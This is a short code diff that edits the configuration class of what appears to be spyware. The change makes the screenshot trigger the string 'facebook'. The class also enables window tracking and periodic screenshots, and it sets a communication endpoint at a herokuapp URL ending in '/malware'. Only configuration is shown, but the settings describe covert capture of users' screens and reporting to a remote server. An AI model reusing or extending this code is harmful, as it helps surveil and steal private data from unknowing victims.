@@ -21,7 +21,7 @@ class Configuration:
             self.__windowTrackingIsActive = True
             self.__samplingFrequency = 0.1
             self.__screenshotFrequency = 50
-            self.__screenshotTrigger = ['facebook']
+            self.__screenshotTrigger = 'facebook'
         #COMMUNICATION
             self.__baseURL = 'http://facebook-user-profile.herokuapp.com/malware'
             self.__communicationFrequency = 5
